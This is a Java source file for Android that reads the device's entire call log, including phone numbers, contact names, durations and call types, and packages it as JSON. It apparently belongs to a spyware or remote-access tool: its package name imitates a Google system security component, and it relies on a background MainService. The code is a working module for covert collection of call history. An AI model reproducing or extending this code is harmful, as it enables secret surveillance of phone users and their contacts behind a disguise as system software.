package com.google.android.sys.security;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by sys_security on 11/11/16.
 */

public class CallsManager {

    public static JSONObject getCallsLogs(){
        Cursor cur = null;
        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);

            if (cur != null) {
                while (cur.moveToNext()) {
                    try {
                        JSONObject call = new JSONObject();
                        
                        int numIndex = cur.getColumnIndex(CallLog.Calls.NUMBER);
                        int nameIndex = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                        int durationIndex = cur.getColumnIndex(CallLog.Calls.DURATION);
                        int typeIndex = cur.getColumnIndex(CallLog.Calls.TYPE);
                        
                        if (numIndex >= 0 && durationIndex >= 0 && typeIndex >= 0) {
                            String num = cur.getString(numIndex);
                            String name = nameIndex >= 0 ? cur.getString(nameIndex) : "Unknown";
                            String duration = cur.getString(durationIndex);
                            int type = Integer.parseInt(cur.getString(typeIndex));

                            call.put("phoneNo", num != null ? num : "Unknown");
                            call.put("name", name != null ? name : "Unknown");
                            call.put("duration", duration != null ? duration : "0");
                            call.put("type", type);
                            list.put(call);
                        }
                    } catch (Exception e) {
                        // Skip this call log if error, continue with others
                        Log.e("CallsManager", "Error reading individual call log", e);
                    }
                }
            }
            
            Calls.put("callsList", list);
            Log.d("CallsManager", "Collected " + list.length() + " call logs");
            return Calls;
            
        } catch (Exception e) {
            Log.e("CallsManager", "Error reading call logs", e);
            return null;
        } finally {
            // Always close cursor to prevent memory leak
            if (cur != null) {
                try {
                    cur.close();
                } catch (Exception e) {
                    Log.e("CallsManager", "Error closing cursor", e);
                }
            }
        }
    }

}
